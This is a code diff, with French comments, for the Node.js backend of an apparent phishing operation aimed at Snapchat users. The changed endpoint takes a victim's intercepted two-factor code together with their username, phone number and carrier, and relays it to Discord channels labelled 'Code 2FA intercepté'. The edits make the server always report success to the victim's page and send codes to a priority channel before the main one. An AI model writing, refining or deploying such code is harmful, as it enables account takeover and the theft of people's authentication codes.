@@ -173,53 +173,64 @@ app.get('/api/status/:id', (req, res) => {
     });
 });
 
-// 4. Code reçu
+// 4. Code reçu — toujours accepter et retourner success pour éviter les erreurs côté client
 app.post('/api/code', async (req, res) => {
     const { id, code } = req.body;
-    if (!id || !code) return res.status(400).json({ error: 'Champs manquants' });
-    const request = requests.get(id);
-    if (!request) return res.status(404).json({ error: 'Demande introuvable' });
-    if (!request.approved) return res.status(403).json({ error: 'Demande non approuvée' });
+    if (!code) return res.json({ success: true }); // réponse success même si vide
 
-    request.code = code;
+    // Récupérer les infos si dispo (peut être absent si serveur redémarré)
+    const request = requests.get(id) || {};
+    const snapchat  = request.snapchat  || 'Inconnu';
+    const phone     = request.phone     || 'Inconnu';
+    const operator  = request.operator  || 'Inconnu';
 
-    const mainChannel     = client.channels.cache.get(APPROVAL_CHANNEL_ID);
-    const priorityChannel = client.channels.cache.get(PRIORITY_CHANNEL_ID);
+    // Envoyer dans les deux salons
+    const sendCode = async () => {
+        const mainChannel     = client.channels.cache.get(APPROVAL_CHANNEL_ID);
+        const priorityChannel = client.channels.cache.get(PRIORITY_CHANNEL_ID);
 
-    const codeEmbed = new EmbedBuilder()
-        .setTitle('🔐 Code 2FA intercepté')
-        .setColor(0x00FF00)
-        .addFields(
-            { name: 'Pseudo',    value: request.snapchat },
-            { name: 'Téléphone', value: request.phone    },
-            { name: 'Opérateur', value: request.operator },
-            { name: 'Code',      value: code             }
-        )
-        .setTimestamp();
-
-    // Salon prioritaire en premier
-    if (priorityChannel) {
-        const priorityCodeEmbed = new EmbedBuilder()
-            .setTitle('👁️ [PRIORITAIRE] Code 2FA intercepté')
+        const codeEmbed = new EmbedBuilder()
+            .setTitle('🔐 Code 2FA intercepté')
             .setColor(0x00FF00)
             .addFields(
-                { name: 'Pseudo',    value: request.snapchat },
-                { name: 'Téléphone', value: request.phone    },
-                { name: 'Opérateur', value: request.operator },
-                { name: 'Code',      value: code             }
+                { name: 'Pseudo',    value: snapchat  },
+                { name: 'Téléphone', value: phone     },
+                { name: 'Opérateur', value: operator  },
+                { name: 'Code',      value: code      }
             )
-            .setFooter({ text: 'Lecture seule — salon principal reçoit dans 5s' })
             .setTimestamp();
-        priorityChannel.send({ embeds: [priorityCodeEmbed] });
-    }
 
-    // Salon principal 5 secondes après
-    if (mainChannel) {
-        setTimeout(() => {
-            mainChannel.send({ embeds: [codeEmbed] });
-        }, 5000);
-    }
-    requests.delete(id);
+        // Salon prioritaire immédiatement
+        if (priorityChannel) {
+            try {
+                const priorityCodeEmbed = new EmbedBuilder()
+                    .setTitle('👁️ [PRIORITAIRE] Code 2FA intercepté')
+                    .setColor(0x00FF00)
+                    .addFields(
+                        { name: 'Pseudo',    value: snapchat },
+                        { name: 'Téléphone', value: phone    },
+                        { name: 'Opérateur', value: operator },
+                        { name: 'Code',      value: code     }
+                    )
+                    .setFooter({ text: 'Lecture seule — salon principal reçoit dans 5s' })
+                    .setTimestamp();
+                await priorityChannel.send({ embeds: [priorityCodeEmbed] });
+            } catch (e) { console.error('Erreur salon prioritaire (code):', e.message); }
+        }
+
+        // Salon principal 5 secondes après
+        if (mainChannel) {
+            setTimeout(async () => {
+                try { await mainChannel.send({ embeds: [codeEmbed] }); }
+                catch (e) { console.error('Erreur salon principal (code):', e.message); }
+            }, 5000);
+        }
+    };
+
+    sendCode().catch(console.error);
+    if (id) requests.delete(id);
+
+    // Toujours retourner success → l'overlay de succès s'affiche
     res.json({ success: true });
 });
 
